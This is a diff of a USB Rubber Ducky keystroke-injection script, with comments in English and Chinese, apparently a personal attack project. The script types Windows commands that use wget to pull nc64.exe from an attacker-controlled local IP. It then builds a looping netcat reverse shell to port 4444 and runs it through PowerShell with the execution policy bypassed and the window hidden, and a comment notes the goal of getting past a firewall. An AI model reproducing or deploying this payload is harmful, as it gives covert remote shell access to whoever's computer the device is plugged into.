@@ -1,3 +1,4 @@
+REM ! over firewall
 
 DELAY 200
 GUI r
@@ -13,6 +14,8 @@ DELAY 800
 STRING exit
 ENTER 
 
+REM maybe the delay maybe not be the same
+REM open cmd
 GUI r
 DELAY 1000
 
@@ -20,17 +23,44 @@ STRING cmd
 ENTER
 DELAY 1000
 
-STRING echo (wget 'http://10.122.232.108/nc64.exe' -OutFile a.exe) > b.ps1
+REM use echo to use kali-wget(my ip)
+
+REM STRING echo (wget 'http://10.122.232.108/nc64.exe' -OutFile a.exe) > b.ps1
+REM yeah the ip need to change by the computer(use ifconfig in kali)
+REM so yeah the previous is above
+
+REM STRING echo (wget 'http://192.168.31.180/nc64.exe' -OutFile a.exe) > b.ps1
+REM the grammer have some problem
+STRING echo "while (`$true) {./a.exe 192.168.31.180 4444 -e cmd.exe -d}" > c.ps1
 ENTER
 DELAY 1000
 STRING powershell -ExecutionPolicy ByPass -File b.ps1
 ENTER
-DELAY 5000
+DELAY 1000
 
-STRING echo while($true){./a.exe 10.122.232.108 4444 -e cmd.exe -d} > c.ps1
+STRING echo while($true){./a.exe 192.168.31.180 4444 -e cmd.exe -d} > c.ps1
 ENTER
 DELAY 1000
 
-STRING start /min powershell -ExecutionPolicy ByPass -File c.ps1 & exit
-DELAY 1000
+
+REM 以上，所有准备文件好了
+REM 接下来后台运行
+
+
+REM 开始（最后还是靠我自己改）
+GUI r
+DELAY 500
+STRING powershell
 ENTER
+DELAY 2000
+REM 定义脚本路径和参数
+STRING $scriptPath = "C:\Users\halfa\c.ps1"
+ENTER
+DELAY 500
+STRING $arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
+ENTER
+DELAY 500
+STRING Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"C:\Users\halfa\c.ps1`"" -WindowStyle Hidden
+ENTER
+
+
